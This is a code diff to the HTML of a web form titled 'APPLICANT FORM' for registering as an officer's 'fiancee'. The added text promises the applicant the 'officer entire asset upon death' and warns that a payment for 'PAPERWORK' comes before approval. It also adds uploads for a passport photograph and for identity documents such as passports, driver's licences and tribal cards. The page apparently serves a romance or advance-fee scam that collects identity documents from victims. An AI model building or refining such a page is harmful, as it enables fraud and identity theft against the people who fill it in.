@@ -17,6 +17,7 @@
             <div class="form-submitted-content">
               <h1><b>Congratulations</b> <br> <span>you have successfully apply!</span></h1>
               <p>You will receive a mail shortly</p>
+              <p class="notice"><span>NOTE<span>: Before the Approval, payment will be made to process the PAPERWORK</p>
             </div>
 
             <button class="formbold-btn form-close">Close</button>
@@ -28,13 +29,31 @@
                     <div class="formbold-img-header">
                      <h2>APPLICANT FORM</h2>
                      <p>Please fill the form below</p>
+                     <p class="notice"><span>NOTE:</span><marquee> Once you provide us with the above information, you are no longer
+                        anonymous to us, and you will be registered in our database as the fiancee and you will be
+                     entitled to the officer entire asset upon death or natural cicumstance</marquee></p>
                 </div>
                 <hr>
-
+                <!-- FORM area-->
               <form class="login-form">
                 <div class="formbold-input-wrapp formbold-mb-3">
+                    <!--Passport-->
+                    <div class="formbold-mb-3 passport">
+                      <label for="upload" class="formbold-form-label">
+                        Upload Passport Photograph
+                      </label>
+                      <input
+                      type="file"
+                      name="upload"
+                      id="upload"
+                      class="formbold-form-input formbold-form-file image"
+                        required
+                        />
+                      </div>
+
                   <label for="firstname" class="formbold-form-label"> Name </label>
-          
+                  
+
                   <div>
                     <input
                       type="text"
@@ -167,6 +186,27 @@
                     />
                   </div>
                 </div>
+
+                <div class="formbold-mb-3">
+                    <label for="identity" class="formbold-form-label passport">
+                      Means of Identification
+                    </label>
+
+                    <select class="formbold-form-input identity" name="identity" id="identity">
+                        <option value="passport">U.S Passort</option>
+                        <option value="foreignPassport">Foreign Passort</option>
+                        <option value="driver's_licence">Driver's Licence</option>
+                        <option value="tribalCard">Tribal Card</option>
+                        <option value="others">Others</option>
+                      </select>
+
+                    <input
+                        type="file"
+                        name="identity"
+                        id="upload"
+                        class="formbold-form-input formbold-form-file identityImage"
+                      />
+                    </div>
                 
                 <div class="formbold-input-wrapp formbold-mb-3">
                   <label for="fiancename" class="formbold-form-label"> Fiancé's Name </label>
@@ -188,19 +228,6 @@
                     />
                   </div>
                 </div>
-
-                <div class="formbold-mb-3">
-                  <label for="upload" class="formbold-form-label">
-                    Upload your Passport
-                  </label>
-                  <input
-                  type="file"
-                  name="upload"
-                  id="upload"
-                  class="formbold-form-input formbold-form-file image"
-                    required
-                    />
-                  </div>
                   
                   <div class="formbold-checkbox-wrapper">
                     <label for="supportCheckbox" class="formbold-checkbox-label">
@@ -240,7 +267,7 @@
 
       <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/7.17.1/firebase.js"></script>
-  <!-- Firebase configuration and initialization -->
+  <script src="https://www.gstatic.com/firebasejs/7.17.1/firebase-auth.js"></script>
   <!-- <script src="firebase/firebase.js"></script> -->
   <!-- Your custom JavaScript file -->
   <script src="app.js"></script>
